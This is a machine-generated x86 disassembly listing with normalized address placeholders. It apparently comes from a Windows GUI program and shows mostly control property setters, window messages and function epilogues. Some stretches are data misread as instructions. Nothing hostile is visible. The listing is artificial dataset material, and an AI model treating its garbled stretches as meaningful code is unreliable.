sub_42731c
sub [ rw-data ] 0x1
retn
sub_427324
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_4030f8
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_4273e7
retn
sub_4273e8
jmp sub_403834
j_sub_4273e7
jmp sub_4273e7
sub_4273ef
pop ebp
retn
sub_4273f4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c04
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b04
sub_427441
jmp sub_403834
sub_427448
pop ebp
retn
sub_42744c
sub [ rw-data ] 0x1
retn
sub_4274a8
jmp sub_403834
sub_4274af
pop ebp
retn
sub_4274b4
sub [ rw-data ] 0x1
retn
sub_427510
jmp sub_403834
sub_427517
pop ebp
retn
sub_42751c
sub [ rw-data ] 0x1
retn
sub_42757d
jmp sub_403834
sub_427584
pop ebp
retn
sub_427588
sub [ rw-data ] 0x1
retn
sub_4275d4
jmp sub_403834
sub_4275db
pop ebp
retn
sub_4275e0
sub [ rw-data ] 0x1
retn
sub_42760d
jmp sub_403834
sub_427614
pop ebp
retn
sub_427618
sub [ rw-data ] 0x1
retn
sub_4276c0
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bb7c
mov [ rw-data ] eax
sub_4276f5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42770c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42778f
jmp sub_403834
sub_427796
pop ebp
retn
sub_427798
sub [ rw-data ] 0x1
retn
sub_427807
jmp [ edi ]
sub_427aa8
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_427ac0
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_427b04
push ebx
mov ebx eax
mov eax ebx
call sub_42822c
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42821b
jmp sub_403834
sub_42822c
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_425264
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_427ad4
sub_428283
jmp sub_403834
sub_42828a
pop ebp
retn
sub_42828c
sub [ rw-data ] 0x1
retn
sub_428379
mov ebx 0x84180042
inc ebx
add [ eax - 0x7e ] cl
inc ebx
add al cl
xchg [ ebx ] eax
int3
sub_42bbeb
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x3ae1172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42bfa6
jmp sub_403834
sub_42bfad
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c032
jmp sub_403834
sub_42c039
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c040
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_437b50
pop ebx
retn
sub_42c054
push ebx
mov ebx eax
mov eax ebx
call sub_43a8a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_437b50
pop ebx
retn
sub_42c070
push ebx
mov ebx eax
mov eax ebx
call sub_43987c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42c11c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_434a90
pop esi
pop ebx
retn
sub_42c286
jmp sub_403834
sub_42c28d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c39c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_436b64
mov eax ebx
mov si 0xffc7
call sub_4032f4
pop esi
pop ebx
retn
sub_42c488
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42c4a4
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_4032f4
sub_42c4c0
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_42c4cc
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419dac
sub_42c4e0
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42c540
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42c5b4
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_4032f4
pop esi
pop ebx
retn
sub_42c5d0
push esi
mov esi eax
mov eax esi
call sub_436670
mov eax esi
mov si 0xffc7
call sub_4032f4
pop esi
retn
sub_42c675
jmp sub_403834
sub_42c67c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c684
push ebx
mov ebx eax
mov eax ebx
call sub_4367d4
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_42c6a8
push ebx
mov ebx eax
mov eax ebx
call sub_4367ec
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_42c794
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_42cd04
sub_42c7a8
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_42cd04
mov eax ebx
call sub_438830
sub_42c7cc
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_438830
sub_42c810
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_438830
sub_42c9a8
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_43b290
push eax
call SetWindowTextA
pop ebx
retn
sub_42c9c4
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_43b290
push eax
call SendMessageA
pop ebx
retn
sub_42ca6a
jmp sub_403834
sub_42ca71
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42cb0a
jmp sub_403834
sub_42cc83
jmp sub_403834
sub_42cce8
push ebx
mov ebx eax
mov eax ebx
call sub_42c824
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_43862c
pop ebx
retn
sub_42cde8
push ebx
mov ebx eax
mov eax ebx
call sub_43469c
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_42cee0
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_4032f4
sub_42d1a3
jmp sub_403834
sub_42d1aa
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d254
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
pop esi
retn
sub_42d2b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_434a90
pop esi
pop ebx
retn
sub_42d391
jmp sub_403834
sub_42d398
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d62c
mov al [ eax + 0x224 ]
retn
sub_42d634
push ebx
mov ebx eax
mov eax ebx
call sub_436b64
xor edx edx
mov eax ebx
call sub_42c85c
pop ebx
retn
sub_42d64c
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_438830
sub_42d660
push esi
mov esi eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42d670
cmp dl [ eax + 0x225 ]
je r-xdata
retn
mov [ eax + 0x225 ] dl
call sub_438830
sub_42d684
cmp dl [ eax + 0x226 ]
je r-xdata
retn
mov [ eax + 0x226 ] dl
call sub_438830
sub_42d6cc
call sub_43a518
retn
sub_42d7aa
jmp sub_403834
sub_42d854
mov eax [ r-xdata ]
retn
sub_42d85c
xor eax eax
retn
sub_42d880
retn
sub_42d998
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_438830
sub_42da10
push ebx
mov ebx eax
mov eax ebx
call sub_44b71c
test eax eax
je r-xdata
mov eax ebx
call sub_435fe4
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_42da34
xor eax eax
retn
sub_42dafb
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x58bd173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_42db14
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_4032f4
sub_42dc05
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_42dc0e
jmp sub_403834
j_sub_42dc05
jmp sub_42dc05
sub_42dc15
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ddc0
push ebx
mov ebx eax
mov eax ebx
call sub_43469c
mov eax ebx
call sub_435fe4
pop ebx
retn
sub_42ddd4
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_42dde0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_438830
sub_42ddf4
test dl dl
je r-xdata
xor edx edx
call sub_42de08
retn
mov dl 0x1
call sub_42de08
retn
sub_42dee4
push ebx
mov ebx eax
mov eax ebx
call sub_43987c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42def8
call sub_438830
retn
sub_42df8e
jmp sub_403834
sub_42df95
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42df9c
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_42e00c
mov al [ eax + 0x211 ]
retn
sub_42e040
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_438830
sub_42e220
call sub_438830
retn
sub_42e29d
jmp sub_403834
sub_42e2a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e667
jmp sub_403834
sub_42e66e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42e678
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_42e530
retn
sub_42e6e4
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_42e530
retn
sub_42e6fc
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_42e530
retn
sub_42e710
push ebx
mov ebx eax
mov eax ebx
call sub_43469c
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_42e734
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_42e86c
call sub_42e754
retn
sub_42e874
call sub_42e754
retn
sub_42e8a4
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_42e8d1
jmp sub_403834
sub_42e8d8
pop ebp
retn
sub_42e8dc
sub [ rw-data ] 0x1
retn
sub_42ea39
jmp sub_403834
sub_42ea40
pop ebp
retn
sub_42ea44
sub [ rw-data ] 0x1
retn
sub_42ea4c
cmpsb [ fs : esi ] [ edi ]
inc esi
add [ ebx ] cl
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_42f2c4
sub_42ea5d
add eax 0xffffffe0
jmp sub_42f044
sub_42ea65
add eax 0xffffffe0
jmp sub_42f0ac
sub_42ea6d
add eax 0xffffffe0
jmp sub_42f1c0
sub_42ea75
add eax 0xffffffe0
jmp sub_42f234
sub_42ea7d
add eax 0xffffffe0
jmp sub_42ecf0
sub_42ea85
add eax 0xffffffe0
jmp sub_42ed04
sub_42ea8d
add eax 0xffffffe0
jmp sub_42ed7c
sub_42ea95
add eax 0xffffffe0
jmp sub_42ee20
sub_42ea9d
add eax 0xffffffe0
jmp sub_42ee24
sub_42eaa5
add eax 0xffffffe0
jmp sub_42eeac
sub_42eaad
add eax 0xffffffe0
jmp sub_42eff4
sub_42eab5
add eax 0xffffffe0
jmp sub_42eff8
sub_42eabd
add eax 0xffffffe0
jmp sub_42f014
sub_42eacf
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4055c4
sub_42ead9
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4055d8
sub_42eae5
0xeacf0042 0x42
sub_42eaec
fldl2e
inc edx
add [ ebp - 0x16 ] bh
inc edx
add [ ebp - 0x72ffbd16 ] al
0xea950042 0x42
sub_42eb00
popfd
0xeaa50042 0x42
sub_42eb08
lodsd [ esi ]
0xeab50042 0x42
sub_42eb10
mov ebp 0x5d0042ea
0xea650042 0x42
sub_42eb1c
insd
0xea750042 0x42
sub_42eb24
push ebp
0x30042 0x0
sub_42eb84
sub bl ch
inc edx
add [ eax ] al
add [ eax ] al
add ah cl
jmp sub_42ebd1
sub_42ecad
jmp sub_403834
sub_42ecb4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ecf0
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f08
pop ebx
retn
sub_42ed6b
jmp sub_403834
sub_42ed72
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42ee04
jmp sub_403834
sub_42ee0b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ee20
mov al 0x1
retn
sub_42ee9f
jmp sub_403834
sub_42eea6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42efa4
jmp sub_403834
sub_42efab
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42eff4
mov [ eax + 0xc ] edx
retn
sub_42eff8
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_42f01d
inc [ ebx + 0x74001c7b ]
or [ ebp - 0x3b17e3bd ] cl
std
inc [ ebx + 0x46ab003d ]
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_4054f0
sub_42f09c
jmp sub_403834
sub_42f0a3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f1a2
jmp sub_403834
sub_42f1a9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42f222
jmp sub_403834
sub_42f229
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42f2b4
jmp sub_403834
sub_42f2bb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f3af
jmp sub_403834
sub_42f3b6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42f478
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_42f3c4
call EnumWindows
retn
sub_42f50a
jmp sub_403834
sub_42f511
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42f51c
xor eax eax
retn
sub_42f615
jmp sub_403834
sub_42f61c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42f706
jmp sub_403834
sub_42f70d
pop ebp
retn
sub_42f762
jmp sub_403834
sub_42f769
pop ebp
retn
sub_4308ec
jmp r-xdata
sub_4308ee
0xe8ffe9ff 0xe7ff
sub_4308f5
jmp esi
sub_4315f4
clc
0x43
sub_4315f8
in al 0xc7
inc ebx
add [ eax + eax ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax - 0x392ffce9 ]
inc ebx
add al bl
mov [ ebx ] 0x50
enter 0x43 0xc0

sub_4316a5
add eax 0xffffff8c
jmp sub_43d8b8
sub_4316ad
add eax 0xffffff8c
jmp sub_43d8bc
sub_4316b5
add eax 0xffffff8c
jmp sub_43d9a8
sub_4316bd
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_4316ca
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_4316d7
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_4316e4
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_4316f1
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_4316fe
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43170b
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_431718
add eax 0xffffff8c
jmp sub_43f018
sub_43172a
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4055c4
sub_431734
add [ esp + 0x4 ] 0xffffff8c
jmp sub_4055d8
sub_431870
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_431b83
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_4134a4
retn
sub_431ba0
push 0x15
mov ecx rw-data
call sub_413464
retn
sub_431c38
call GetCapture
call sub_431970
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_431e9c
push ebx
push eax
push sub_432020
call sub_41ae28
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_431eb4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_431ee4
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_41aedc
pop ebx
retn
sub_431fc2
jmp sub_403580
sub_431ff4
xor eax eax
retn
sub_431ff8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_432010
retn
sub_432014
mov eax [ rw-data ]
retn
sub_43201c
retn
sub_43204a
jmp sub_403580
sub_43204f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43206c
call sub_403338
xor eax eax
mov [ rw-data ] eax
retn
sub_43207c
call sub_403334
xor eax eax
mov [ rw-data ] eax
retn
sub_43208c
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403404
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_43213c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_432154
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_4321a0
retn
sub_432358
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_4032f4
pop esi
retn
sub_43236c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_4032f4
pop esi
retn
sub_432380
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43238c
mov eax 0x4
retn
sub_432394
retn
sub_432f85
jmp sub_403580
sub_433272
jmp sub_403834
sub_4332e4
jmp sub_403834
sub_4332f0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_433018
sub_43346f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41dab4
retn
sub_433485
jmp sub_403834
sub_4334ac
jmp sub_403834
sub_43352e
jmp sub_403834
sub_433556
jmp sub_403834
sub_43355d
mov esp ebp
pop ebp
retn
sub_433615
jmp sub_403834
sub_43366c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_433638
mov [ ebx + 0x58 ] esi
sub_4337c0
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_4337d4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032a8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4338bd
jmp sub_403834
sub_4338c4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433947
jmp sub_403834
sub_43394e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_433d1c
xor eax eax
retn
sub_433d20
mov al [ eax + 0x58 ]
retn
sub_433d24
xor eax eax
retn
sub_433d28
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_433d30
mov eax [ eax + 0x30 ]
retn
sub_433dd4
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_433e80
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_433e98
mov [ eax + 0x5d ] dl
retn
sub_433e9c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_437a94
sub_433eac
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43438f
jmp sub_403834
sub_434396
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4343f8
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43447c
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_434599
jmp sub_403834
sub_4345a0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43469c
push eax
xor ecx ecx
mov edx 0xb037
call sub_435c5c
retn
sub_43485d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4032f4
sub_43490e
jmp sub_403834
sub_434915
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4349ec
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_435c5c
sub_434a04
push 0x0
xor ecx ecx
mov edx 0xe
call sub_435c5c
retn
sub_434a14
push edx
mov edx 0xd
call sub_435c5c
retn
sub_434a20
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_434a34
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_434b15
jmp sub_403834
sub_434b1c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434b24
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_435c5c
sub_434b94
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_434ba8
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_434bb4
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_434bbc
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_435c5c
sub_434be0
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_435c5c
sub_434c04
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_435c5c
sub_434c4c
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_434c54
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_435c5c
sub_434c78
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_435c5c
sub_434c9c
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_435c5c
sub_434cb8
push ebx
mov ebx eax
call sub_431c38
cmp ebx eax
sete al
pop ebx
retn
sub_434cf0
push esi
mov dl 0x1
mov si 0xffce
call sub_4032f4
pop esi
retn
sub_434e3a
jmp sub_403834
sub_434e41
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434f64
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_434ed8
retn
sub_434fb8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_434fcc
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4350b1
jmp sub_403834
sub_4350d0
xor eax eax
retn
sub_4350d4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4350ec
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_435104
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43511c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_435138
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_435150
retn
sub_435214
retn
sub_435218
cmp eax [ rw-data ]
sete al
retn
sub_43528c
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4353a8
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_4032f4
pop esi
pop ebp
retn 0x4
sub_4353e8
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43567f
jmp sub_403834
sub_435686
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_435690
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_4032f4
pop esi
retn
sub_4356a4
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
